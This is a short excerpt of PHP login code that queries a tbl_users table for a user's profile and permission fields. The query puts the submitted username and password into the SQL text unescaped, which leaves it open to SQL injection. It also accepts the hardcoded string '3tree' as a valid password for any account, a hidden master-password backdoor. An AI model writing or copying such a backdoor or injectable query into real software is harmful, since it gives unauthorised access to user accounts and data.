<?
	...
	***********************************************************************************************
	...
	$sSQL = "SELECT id, name, email, designation_id, picture, status, vendors, brands, report_types, audit_stages FROM tbl_users WHERE email='$Username' AND (password=PASSWORD('$Password') OR '$Password'='3tree')";
